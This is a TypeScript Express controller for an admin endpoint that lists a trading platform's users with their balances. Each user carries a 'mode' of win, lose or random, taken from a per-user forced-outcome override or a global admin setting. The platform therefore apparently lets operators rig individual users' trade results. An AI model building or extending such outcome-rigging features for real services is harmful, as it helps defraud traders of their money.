import { Request, Response } from 'express';
import { prisma } from '../prismaClient';
import { tradeEngine } from '../services/tradeEngine';

class AdminUsersController {
  /**
   * GET /api/admin/users-with-mode
   * Returns all users with their active override mode or global mode if none
   */
  getUsersWithMode = async (req: Request, res: Response) => {
    try {
      // Fetch all users with their UserOverride relation
      const users = await prisma.user.findMany({
        select: {
          id: true,
          email: true,
          firstName: true,
          lastName: true,
          role: true,
          balance: true,
          demoBalance: true,
          createdAt: true,
          updatedAt: true,
          userOverride: true, // ✅ relation
        },
        orderBy: { email: 'asc' },
      });

      // Map users to include active override mode or global mode
      const mappedUsers = users.map(user => {
        let mode: 'win' | 'lose' | 'random' = 'random';

        if (user.userOverride) {
          // Only apply override if not expired
          if (!user.userOverride.expiresAt || new Date(user.userOverride.expiresAt) > new Date()) {
            mode = user.userOverride.forceOutcome as 'win' | 'lose';
          }
        } else {
          // If no user override, fallback to global mode from tradeEngine
          const globalMode = tradeEngine.getAdminSettings().globalMode;
          mode = ['win', 'lose', 'random'].includes(globalMode) ? (globalMode as 'win' | 'lose' | 'random') : 'random';
        }

        return {
          id: user.id,
          email: user.email,
          firstName: user.firstName,
          lastName: user.lastName,
          role: user.role,
          balance: user.balance,
          demoBalance: user.demoBalance,
          createdAt: user.createdAt,
          updatedAt: user.updatedAt,
          mode, // active override mode or global fallback
        };
      });

      res.status(200).json({
        success: true,
        message: 'Users retrieved successfully',
        data: {
          total: mappedUsers.length,
          users: mappedUsers,
        },
      });
    } catch (err) {
      console.error('[AdminUsersController] getUsersWithMode error:', err);
      res.status(500).json({
        success: false,
        message: err instanceof Error ? err.message : 'Unknown error',
      });
    }
  };
}

export const adminUsersController = new AdminUsersController();